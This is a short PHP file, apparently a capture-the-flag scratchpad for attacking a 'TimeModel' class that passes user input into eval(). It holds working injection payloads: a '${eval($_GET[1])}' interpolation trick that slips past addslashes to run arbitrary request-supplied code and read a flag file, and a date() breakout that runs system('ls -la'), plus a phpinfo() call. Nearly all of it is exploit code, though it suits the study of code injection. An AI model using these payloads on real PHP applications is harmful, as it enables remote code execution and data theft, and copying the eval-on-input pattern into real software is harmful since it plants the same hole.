<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes("${eval($_GET[1])}&1=system('cat ../flagaBWBE');");

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
date('r');

[ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
$test = "+${d} day +${h} hour +${m} minute +${s} second";
$injectMe = addslashes('l"); $time = system("ls -la"); $dummy = date("r');
eval('$time = date("' . $injectMe . '", strtotime("' . $test . '"));');

// what eval-ed
// $time = date("l\"); $time = system(\"ls -la\"); $dummy = date(\"r", strtotime($test));  

phpinfo();